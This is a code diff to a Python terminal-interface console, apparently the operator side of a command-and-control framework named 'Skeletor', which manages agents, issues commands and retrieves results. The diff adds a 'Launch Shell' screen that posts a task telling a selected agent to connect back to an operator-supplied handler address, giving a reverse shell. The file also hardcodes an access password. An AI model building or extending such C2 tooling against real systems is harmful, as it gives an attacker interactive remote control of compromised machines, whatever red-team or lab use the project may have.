@@ -12,6 +12,7 @@ import requests
 # Use environment variables with fallback
 SKELETOR_IP = os.getenv("SKELETOR_IP", "127.0.0.1")
 SKELETOR_PORT = os.getenv("SKELETOR_PORT", "80")
+SKELETOR_WEBSHELL_HANDLER_ADDR = os.getenv("SKELETOR_WEBSHELL_HANDLER_ADDR","127.0.0.1:9000")
 CUSTOM_HEADERS = {}
 SKELETOR_PASSWD = "letredin"
 if SKELETOR_PASSWD is not None:
@@ -83,6 +84,10 @@ class Manager(App):
         height: auto;
         min-height: 10;
     }
+
+    #agent-display, #command-container, #results-container, #shell-container {
+        padding: 1;
+    }
     """
 
     BINDINGS = [
@@ -100,6 +105,7 @@ class Manager(App):
             yield OptionList(
                 Option("Get Agent Status", id="status"),
                 Option("Issue A Command", id="cmd"),
+                Option("Launch Shell", id="shell"),
                 Option("Get Results", id="results"),
                 Option("Exit", id="exit"),
             )
@@ -120,6 +126,16 @@ class Manager(App):
             yield Label("Command:")
             yield Input(placeholder="Enter command (e.g., whoami, ls -la)...", id="command-input")
             yield Button("Submit Command", id="submit-command", variant="primary")
+            yield Static("", id="status-message")
+            yield Button("Back to Menu", classes="back-button")
+
+        with Container(id="shell-container", classes="hidden"):
+            yield Static("Launch Interactive Shell", classes="screen-title")
+            yield Static("Select Agent to connect back to your handler:")
+            yield OptionList(id="shell-agent-selector")
+            yield Label("Handler Address (IP:Port):")
+            yield Input(value=SKELETOR_WEBSHELL_HANDLER_ADDR, id="shell-handler-input")
+            yield Button("Launch Shell", id="launch-shell-button", variant="primary")
             yield Static("", id="status-message")
             yield Button("Back to Menu", classes="back-button")
 
@@ -155,7 +171,7 @@ class Manager(App):
         self.fetch_agents(update_table=True)
     
     @work(exclusive=True, thread=True)
-    def fetch_agents(self, update_table=False, update_selector=False, update_results_selector=False):
+    def fetch_agents(self, update_table=False, update_selector=False, update_results_selector=False,update_shell_selector=False):
         """Fetch agents in background and update appropriate view."""
         try:
             response = requests.get(
@@ -171,6 +187,8 @@ class Manager(App):
                 self.call_from_thread(self._update_agent_selector, agents, None)
             if update_results_selector:
                 self.call_from_thread(self._update_results_selector, agents, None)
+            if update_shell_selector:
+                self.call_from_thread(self._update_shell_selector, agents, None)
                 
         except requests.exceptions.ConnectionError:
             error = "Connection failed - is the server running?"
@@ -196,6 +214,13 @@ class Manager(App):
                 self.call_from_thread(self._update_agent_selector, None, error)
             if update_results_selector:
                 self.call_from_thread(self._update_results_selector, None, error)
+
+    def _update_shell_selector(self, agents, error):
+        selector = self.query_one("#shell-agent-selector", OptionList)
+        selector.clear_options()
+        if agents:
+            for agent in agents:
+                selector.add_option(Option(f"{agent.get('agent_id')} ({agent.get('status')})", id=agent.get('agent_id')))
     
     def _update_agent_table(self, agents, error):
         """Update the agent table with fetched data."""
@@ -275,6 +300,7 @@ class Manager(App):
         self.query_one("#agent-display").add_class("hidden")
         self.query_one("#command-container").add_class("hidden")
         self.query_one("#results-container").add_class("hidden")
+        self.query_one("#shell-container").add_class("hidden")
 
     def on_option_list_option_selected(self, event: OptionList.OptionSelected):
         """Handle menu selection (only for main menu)"""
@@ -288,6 +314,8 @@ class Manager(App):
                 self.show_command_interface()
             elif event.option.id == "results":
                 self.show_results_interface()
+            elif event.option.id == "shell":
+                self.show_shell_interface()
 
     def on_button_pressed(self, event: Button.Pressed):
         """Handle button clicks."""
@@ -297,6 +325,8 @@ class Manager(App):
             self.submit_command()
         elif event.button.id == "get-results-button":
             self.get_agent_results()
+        elif event.button.id == "launch-shell-button":
+            self.launch_shell()
     
     def show_menu(self):
         """Return to the main menu."""
@@ -468,6 +498,46 @@ Result:
     def action_show_menu(self):
         """Return to the main menu when 'b' is pressed."""
         self.show_menu()
+    
+    def show_shell_interface(self):
+        """Switch to shell interface and fetch agents."""
+        self._hide_all_containers()
+        self.query_one("#shell-container").remove_class("hidden")
+        self._update_status_message("Loading agents...", "#shell-container")
+        self.fetch_agents(update_shell_selector=True)
+
+    def launch_shell(self):
+            """Trigger the interactive shell task."""
+            selector = self.query_one("#shell-agent-selector", OptionList)
+            handler_input = self.query_one("#shell-handler-input", Input)
+            
+            if selector.highlighted is not None:
+                option = selector.get_option_at_index(selector.highlighted)
+                if option.id not in ["error", "none", "loading"]:
+                    agent_id = option.id
+                    handler_addr = handler_input.value.strip()
+                    self._update_status_message(f"Tasking {agent_id} to connect to {handler_addr}...", "#shell-container")
+                    self.issue_shell_task(agent_id, handler_addr)
+                    return
+
+            self._update_status_message("Error: Please select an agent", "#shell-container")
+
+    @work(exclusive=True, thread=True)
+    def issue_shell_task(self, agent_id: str, handler_addr: str):
+        try:
+            task_data = {
+                'agent_id': agent_id,
+                'action': 'shell',
+                'input': handler_addr
+            }
+            response = requests.post(
+                f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task",
+                json=task_data, timeout=5, headers=CUSTOM_HEADERS
+            )
+            response.raise_for_status()
+            self.call_from_thread(self._update_status_message, f"✓ Shell task sent to {agent_id}!", "#shell-container")
+        except Exception as e:
+            self.call_from_thread(self._update_status_message, f"✗ Error: {str(e)}", "#shell-container")
 
 
 if __name__ == "__main__":
